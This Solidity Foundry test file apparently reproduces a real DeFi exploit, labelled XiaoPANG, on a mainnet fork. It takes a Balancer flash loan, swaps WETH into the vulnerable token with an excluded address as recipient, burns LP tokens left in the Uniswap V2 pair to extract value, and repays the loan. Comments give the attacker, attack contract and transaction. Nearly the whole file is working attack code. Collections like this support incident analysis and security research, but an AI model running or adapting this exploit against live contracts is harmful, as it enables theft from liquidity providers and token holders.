// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 87,906.71$
// Attacker : https://etherscan.io/address/0x43dEbe92A7A32DCa999593fAd617dBD2e6b080a5
// Attack Contract : https://etherscan.io/address/0xF9729aA0aFEE571E3437528a7e4757FC56407C11
// Vulnerable Contract : https://etherscan.io/address/0x15AD98ed61Ea3922b08dD1990dd4CF7f69489745
// Attack Tx : https://etherscan.io/tx/0x6cc9d3c00bf784442ca89388f42c1ed5e9284235e93f00ef6bd299760e559ccf

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x15AD98ed61Ea3922b08dD1990dd4CF7f69489745#code

// @Analysis
// Post-mortem :
// Twitter Guy :
// Hacking God :
pragma solidity ^0.8.5;

contract XiaoPANGExploit is BaseTestWithBalanceLog {
    address uniV2Pair = 0x15AD98ed61Ea3922b08dD1990dd4CF7f69489745;
    address balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address uniV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address vulnToken;
    address WETH;

    address excludedTargetAddr = 0xb91060B06DCB9b8D16639C72E99DcaF44610079B;

    uint256 flashAmt = 1000 ether;

    IUniswapV2Pair pair = IUniswapV2Pair(uniV2Pair);
    IBalancerVault balancer = IBalancerVault(balancerVault);
    Uni_Router_V2 Router = Uni_Router_V2(uniV2Router);

    function setUp() public {
        vm.createSelectFork(
            "mainnet", vm.parseBytes32("0x6cc9d3c00bf784442ca89388f42c1ed5e9284235e93f00ef6bd299760e559ccf")
        );
        vulnToken = pair.token0();
        fundingToken = pair.token1();
        WETH = fundingToken;
        IERC20(WETH).approve(uniV2Router, flashAmt);
    }

    function testExploit() public balanceLog {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmt;
        balancer.flashLoan(address(this), tokens, amounts, "");
    }

    function getPath() internal view returns (address[] memory path) {
        path = new address[](2);
        path[0] = WETH;
        path[1] = vulnToken;
    }

    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            flashAmt, 0, getPath(), excludedTargetAddr, block.timestamp
        );
        require(pair.balanceOf(uniV2Pair) > 0, "INSUFFICIENTLP");
        pair.burn(address(this));
        IERC20(WETH).transfer(msg.sender, flashAmt);
    }
}
